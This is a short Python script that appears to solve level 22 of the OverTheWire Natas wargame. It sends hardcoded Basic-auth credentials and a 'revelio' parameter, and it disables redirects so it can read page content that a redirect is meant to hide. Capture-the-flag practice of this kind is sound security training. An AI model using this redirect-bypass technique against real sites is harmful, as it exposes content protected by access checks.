
import requests
import base64

URL = "http://natas22.natas.labs.overthewire.org"

username = "natas22"
password = "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz"
cookies = {'PHPSESSID':''}
headers = {"authorization":'Basic {0}'.format(base64.b64encode(f"{username}:{password}".encode()).decode())}

params = {'revelio':''}

response = requests.get(URL, params=params, cookies=cookies, headers=headers, allow_redirects=False)

print(response.text)